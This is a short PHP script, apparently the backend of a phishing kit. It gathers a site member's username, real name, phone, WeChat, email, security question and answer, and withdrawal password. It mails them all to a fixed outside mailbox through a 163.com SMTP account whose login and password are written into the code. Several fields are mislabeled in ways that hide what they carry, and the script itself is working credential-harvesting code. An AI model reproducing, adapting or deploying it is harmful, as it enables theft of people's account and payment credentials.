<?php
require 'PHPMailer/phpmailer.php';
$member = array('username'=>$username,
    'sex'=>$sex,//pwd
    'mobile'=>$mobile,
    'pay_name'=> $pay_name,//真名
    'weixin' =>$weixin,
    'email' =>$email,
    'ask' =>$ask,//问题
    'answer' =>$answer,//回
    'qk_pwd' =>$birthday,//取 取款密码
);
get_email($member);
function get_email($arr){
    $mail = new PHPMailer();
    $mail->IsSMTP();
    //定义
    $sendto_email = "zhongqz@126.com";
    $user_name ="zhongqz";
    $subject ="会员 ";
    $code =  time();
    
    $mail->Host = "smtp.163.com";   // SMTP servers
    $mail->SMTPAuth = true;           // turn on SMTP authentication
    $mail->Username = "13028265397";     // SMTP username  注意：普通邮件认证不需要加 @域名
    $mail->Password = "a123456"; // SMTP password
    $mail->From = "13028265397@163.com";      // 发件人邮箱
    $mail->FromName = "管理员";  // 发件人
    
    
    $mail->CharSet = "utf-8";   // 这里指定字符集！
    $mail->Encoding = "base64";
    $mail->AddAddress($sendto_email, $user_name);  // 收件人邮箱和姓名
    $mail->SetFrom('13028265397@163.com', $arr['username']);
    $mail->IsHTML(true);  // send as HTML
    // 邮件主题
    $mail->Subject = $subject;
    // 邮件内容
    $mail->Body = '<html><head>
<meta http-equiv="Content-Language" content="zh-cn"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
</head>
<body>
    
会员账号:'.$arr['username'].' <br/>
 真实姓名:'.$arr['pay_name'].'  <br/>
  联系电话:'.$arr['mobile'].' <br/>
QQ或E-mail:'.$arr['email'].' <br/>
 微信号:'.$arr['weixin'].' <br/>
 密码问题:'.$arr['ask'].' <br/>
密码答案:'.$arr['answer'].' <br/>
取款密码 :'.$arr['qk_pwd'].'<br/>
</body>
</html>
';
    $mail->AltBody = "text/html";
    
    if (!$mail->Send())
    {
        $mail->ClearAddresses();
        echo "邮件错误信息: " . $mail->ErrorInfo;
        exit;
    }
    else
    {
        $mail->ClearAddresses();
    }
    return true;
}
